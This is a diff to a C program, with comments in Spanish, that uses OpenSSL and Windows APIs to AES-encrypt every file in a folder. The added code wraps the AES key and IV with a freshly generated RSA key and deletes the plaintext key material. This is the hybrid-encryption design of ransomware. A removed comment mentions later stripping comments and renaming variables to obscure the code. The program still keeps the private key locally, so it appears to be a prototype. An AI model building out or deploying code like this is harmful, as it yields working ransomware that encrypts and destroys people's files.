@@ -4,12 +4,103 @@
 #include <tchar.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
-/* TODO
-Se abre la carpeta y se encripta correctamente.
-A la hora de desencriptar ocurre un problema con ello. Si le ponemos una extensión personalizada no puede abrir el archivo y simplemente genera una copia en las carpetas (encriptadas).
-Si no le ponemos extensión parece que funciona pero se pierde la informacion original.
-Cuando terminemos tenemos que quitar los comentarios, renombrar variables y quitar los printf para aumentar la velocidad.
-*/
+#include <openssl/rsa.h>
+#include <openssl/pem.h>
+#include <openssl/err.h>
+
+void generateRSAKeyPair(const char *privateKeyFileName, const char *publicKeyFileName) {
+    RSA *rsa = RSA_new();
+    BIGNUM *e = BN_new();
+
+    if (rsa && e) {
+        if (BN_set_word(e, RSA_F4) && RSA_generate_key_ex(rsa, 2048, e, NULL)) {
+            FILE *privateKeyFile = fopen(privateKeyFileName, "wb");
+            FILE *publicKeyFile = fopen(publicKeyFileName, "wb");
+            if (privateKeyFile) {
+                PEM_write_RSAPrivateKey(privateKeyFile, rsa, NULL, NULL, 0, NULL, NULL);
+                PEM_write_RSAPublicKey(publicKeyFile, rsa);
+                fclose(publicKeyFile);
+                fclose(privateKeyFile);
+            }
+        }
+
+        BN_free(e);
+        RSA_free(rsa);
+    }
+}
+
+void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
+    // Abre el archivo de entrada y el archivo de salida
+    FILE* inputFile = fopen(inputFileName, "rb");
+    FILE* outputFile = fopen(outputFileName, "wb");
+
+    if (inputFile && outputFile) {
+        // Tamaño del buffer de entrada
+        size_t inputBufferSize = RSA_size(publicKey);
+
+        unsigned char inputBuffer[inputBufferSize];
+        unsigned char outputBuffer[inputBufferSize];
+
+        // Lee datos del archivo de entrada y los encripta con la clave pública
+        while (1) {
+            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
+            if (bytesRead == 0) {
+                break;
+            }
+
+            int encryptedSize = RSA_public_encrypt(bytesRead, inputBuffer, outputBuffer, publicKey, RSA_PKCS1_PADDING);
+            if (encryptedSize < 0) {
+                // Manejo de error
+                break;
+            }
+
+            fwrite(outputBuffer, 1, encryptedSize, outputFile);
+        }
+
+        // Cierra los archivos
+        fclose(inputFile);
+        fclose(outputFile);
+
+        remove(inputFileName);
+    }
+}
+
+void decryptWithPrivateKey(const char* inputFileName, const char* outputFileName, RSA* privateKey) {
+    // Abre el archivo cifrado de entrada y el archivo de salida
+    FILE* inputFile = fopen(inputFileName, "rb");
+    FILE* outputFile = fopen(outputFileName, "wb");
+
+    if (inputFile && outputFile) {
+        // Tamaño del buffer de entrada
+        size_t inputBufferSize = RSA_size(privateKey);
+
+        unsigned char inputBuffer[inputBufferSize];
+        unsigned char outputBuffer[inputBufferSize];
+
+        // Lee datos cifrados del archivo de entrada y los descifra con la clave privada
+        while (1) {
+            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
+            if (bytesRead == 0) {
+                break;
+            }
+
+            int decryptedSize = RSA_private_decrypt(bytesRead, inputBuffer, outputBuffer, privateKey, RSA_PKCS1_PADDING);
+            if (decryptedSize < 0) {
+                // Manejo de error
+                break;
+            }
+
+            fwrite(outputBuffer, 1, decryptedSize, outputFile);
+        }
+
+        // Cierra los archivos
+        fclose(inputFile);
+        fclose(outputFile);
+
+        remove(inputFileName);
+    }
+}
+
 void generateRandomKey(unsigned char *key, int keyLength) {
     RAND_bytes(key, keyLength);
 }
@@ -115,16 +206,32 @@ int main() {
     // Definir la ruta completa al archivo del IV
     const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt";
 
+    const char *privateKeyFileName = "C:\\Users\\usuario\\Desktop\\privado.pem"; 
+    const char *publicKeyFileName = "C:\\Users\\usuario\\Desktop\\publico.pem";
+    const char *clavecifrada = "C:\\Users\\usuario\\Desktop\\AEScifrado.txt";
+    const char *ivAEScifrada = "C:\\Users\\usuario\\Desktop\\IVcifrado.txt";
+
     // Definir la clave y el vector de inicialización (IV)
     unsigned char key[32];
     unsigned char iv[16];
 
     // Verificar si el archivo de clave existe
-    FILE *keyFile = fopen(keyFileName, "rb");
-    if (keyFile) {
+    FILE *cifrado = fopen(clavecifrada, "rb");
+    if (cifrado) {
+        fclose(cifrado);
+        FILE *privateKeyFile = fopen(privateKeyFileName, "rb");
+        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFile, NULL, NULL, NULL);
+        fclose(privateKeyFile);
+
+        decryptWithPrivateKey(clavecifrada, keyFileName, clavePrivada);
+        decryptWithPrivateKey(ivAEScifrada, ivFileName, clavePrivada);
+
+        RSA_free(clavePrivada);
+
+        FILE *keyFile = fopen(keyFileName, "rb");
         fread(key, 1, sizeof(key), keyFile);
         fclose(keyFile);
-
+        
         // Leer el IV desde el archivo
         FILE *ivFile = fopen(ivFileName, "rb");
         if (ivFile) {
@@ -165,6 +272,7 @@ int main() {
 
             remove(keyFileName);
             remove(ivFileName);
+            remove(privateKeyFileName);
             FindClose(hFind);
             printf("Archivos desencriptados con éxito.\n");
         } else {
@@ -178,6 +286,17 @@ int main() {
         // Generar un IV aleatorio
         generateRandomIV(iv, sizeof(iv));
         saveIVToFile(ivFileName, iv, sizeof(iv));
+
+        generateRSAKeyPair(privateKeyFileName, publicKeyFileName);
+
+        FILE* publicKeyFile = fopen(publicKeyFileName, "rb");
+        RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
+        fclose(publicKeyFile);
+
+        encryptWithPublicKey(keyFileName, clavecifrada, clavePublica);
+        encryptWithPublicKey(ivFileName, ivAEScifrada, clavePublica);
+
+        RSA_free(clavePublica);
 
         // Realizar operaciones de cifrado sobre los archivos de la carpeta "patata"
         WIN32_FIND_DATA findFileData;
@@ -207,6 +326,7 @@ int main() {
 
             FindClose(hFind);
             printf("Archivos encriptados con éxito y la clave se ha guardado en '%s'.\n", keyFileName);
+            remove(publicKeyFileName);
         } else {
             printf("Error al abrir la carpeta de archivos a encriptar.\n");
         }
